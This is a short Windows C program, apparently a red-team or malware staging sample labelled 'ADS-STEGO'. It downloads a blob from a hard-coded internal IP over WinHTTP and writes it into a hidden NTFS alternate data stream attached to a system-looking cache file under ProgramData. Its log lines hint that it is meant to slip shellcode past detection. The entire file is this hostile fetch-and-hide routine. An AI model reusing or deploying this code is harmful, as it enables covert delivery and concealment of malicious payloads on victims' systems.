
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
int main() {
    printf("[ADS-STEGO] Fetching spectral data...\n");
    HINTERNET hs = WinHttpOpen(L"WinHTTP/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    HINTERNET hc = WinHttpConnect(hs, L"192.168.217.146", 8080, 0);
    HINTERNET hr = WinHttpOpenRequest(hc, L"GET",
        L"/output/v6/spectral.blob", NULL, NULL, NULL, 0);
    WinHttpSendRequest(hr, NULL, 0, NULL, 0, 0, 0);
    WinHttpReceiveResponse(hr, NULL);

    const char* stream = "C:\\ProgramData\\Microsoft\\Windows\\Caches\\caches.db:Properties";
    HANDLE hs2 = CreateFileA(stream, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    BYTE buf[4096]; DWORD read=0, written=0;
    while(WinHttpReadData(hr, buf, sizeof(buf), &read) && read > 0)
        WriteFile(hs2, buf, read, &written, NULL);

    CloseHandle(hs2);
    WinHttpCloseHandle(hr); WinHttpCloseHandle(hc); WinHttpCloseHandle(hs);
    printf("[ADS-STEGO] Spectral data hidden in ADS\n");
    printf("[ADS-STEGO] No shellcode bytes transferred\n");
    getchar(); return 0;
}
